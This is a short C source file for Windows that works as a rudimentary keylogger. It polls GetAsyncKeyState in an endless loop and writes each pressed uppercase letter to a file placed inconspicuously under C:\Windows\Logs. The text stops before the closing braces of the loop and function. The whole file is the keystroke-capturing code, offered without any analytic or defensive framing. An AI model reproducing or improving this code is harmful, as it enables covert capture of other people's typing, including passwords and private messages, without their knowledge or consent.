# include <stdio.h>
# include <windows.h>
int main(){
 //Create file.txt
 const char *route = ("C:\\Windows\\Logs\\logsData.txt");
 FILE *f = fopen(route, "w"); //f is file
 if(f == NULL){
  perror("Error creating file");
  return 1;
 }
 char mayusArr[] = {
    'A','B','C','D','E','F','G','H','I','J','K','L','M',
    'N','Ñ','O','P','Q','R','S','T','U','V','W','X','Y','Z' 
 };
while(1){
 int mayusArrLen = sizeof(mayusArr) / sizeof(mayusArr[0]); // Array Length
 for(int x = 0; x<mayusArrLen;x++){
 if(GetAsyncKeyState(mayusArr[x]) & 0x8000){
  fprintf(f,"%c",mayusArr[x]);
  fflush(f);
 }
}
